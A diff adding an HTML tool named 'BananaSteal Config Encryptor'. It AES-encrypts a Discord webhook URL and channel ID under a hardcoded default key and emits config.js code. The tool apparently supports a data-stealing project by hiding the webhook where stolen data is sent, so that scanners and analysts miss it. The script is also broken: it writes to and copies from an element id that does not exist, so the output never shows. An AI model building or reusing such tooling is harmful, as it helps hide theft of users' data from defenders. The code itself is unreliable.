@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BananaSteal Config Encryptor</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #1e1e1e;
+            color: #e0e0e0;
+        }
+        
+        h1 {
+            color: #ffd700;
+        }
+        
+        .container {
+            background-color: #2d2d2d;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #444;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #ffd700;
+        }
+        
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            background-color: #3d3d3d;
+            color: #e0e0e0;
+            border: 1px solid #555;
+            border-radius: 4px;
+            font-family: monospace;
+            box-sizing: border-box;
+        }
+        
+        button {
+            background-color: #ffd700;
+            color: #1e1e1e;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        button:hover {
+            background-color: #ffed4e;
+        }
+        
+        .output {
+            background-color: #3d3d3d;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+            border: 1px solid #555;
+        }
+        
+        .copy-btn {
+            background-color: #4a9eff;
+            color: white;
+            padding: 5px 10px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        
+        .copy-btn:hover {
+            background-color: #6bb3ff;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔐 BananaSteal Config Encryptor</h1>
+    
+    <div class="container">
+        <div class="input-group">
+            <label for="encryption-key">Encryption Key:</label>
+            <input type="text" id="encryption-key" value="BananaSteal2026SecureKey" placeholder="Enter encryption key">
+        </div>
+        
+        <div class="input-group">
+            <label for="webhook-url">Discord Webhook URL:</label>
+            <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
+        </div>
+        
+        <div class="input-group">
+            <label for="channel-id">Discord Channel ID:</label>
+            <input type="text" id="channel-id" placeholder="1234567890">
+        </div>
+        
+        <button onclick="encryptConfig()">🔒 Encrypt Values</button>
+        
+        <div class="output" id="output" style="display: none;">
+            <h3>Encrypted Values (Copy to config.js):</h3>
+            
+            <div>
+                <strong>Webhook URL:</strong>
+                <div style="word-break: break-all; margin-top: 5px; background-color: #2d2d2d; padding: 10px; border-radius: 4px;">
+                    <code id="encrypted-webhook"></code>
+                    <button class="copy-btn" onclick="copyToClipboard('encrypted-webhook')">Copy</button>
+                </div>
+            </div>
+            
+            <div style="margin-top: 15px;">
+                <strong>Channel ID:</strong>
+                <div style="word-break: break-all; margin-top: 5px; background-color: #2d2d2d; padding: 10px; border-radius: 4px;">
+                    <code id="encrypted-channel"></code>
+                    <button class="copy-btn" onclick="copyToClipboard('encrypted-channel')">Copy</button>
+                </div>
+            </div>
+            
+            <div style="margin-top: 15px;">
+                <strong>Full Config Code:</strong>
+                <pre id="full-config" style="background-color: #2d2d2d; padding: 10px; border-radius: 4px; overflow-x: auto;"></pre>
+                <button class="copy-btn" onclick="copyToClipboard('full-config-code')">Copy Full Code</button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+        function encryptConfig() {
+            const key = document.getElementById('encryption-key').value;
+            const webhook = document.getElementById('webhook-url').value;
+            const channel = document.getElementById('channel-id').value;
+            
+            if (!webhook || !channel) {
+                alert('Please fill in all values');
+                return;
+            }
+            
+            const encryptedWebhook = CryptoJS.AES.encrypt(webhook, key).toString();
+            const encryptedChannel = CryptoJS.AES.encrypt(channel, key).toString();
+            
+            document.getElementById('encrypted-webhook').textContent = encryptedWebhook;
+            document.getElementById('encrypted-channel').textContent = encryptedChannel;
+            
+            const fullConfig = `// Encryption key (change this to a unique key for your site)
+const ENCRYPTION_KEY = '${key}';
+
+// Encrypted Discord Configuration
+const ENCRYPTED_DISCORD_CONFIG = {
+    WEBHOOK_URL: '${encryptedWebhook}',
+    CHANNEL_ID: '${encryptedChannel}'
+};`;
+            
+            document.getElementById('full-config').textContent = fullConfig;
+            document.getElementById('full-config-code').textContent = fullConfig;
+            
+            document.getElementById('output').style.display = 'block';
+        }
+        
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.textContent;
+            
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '✓ Copied!';
+                
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
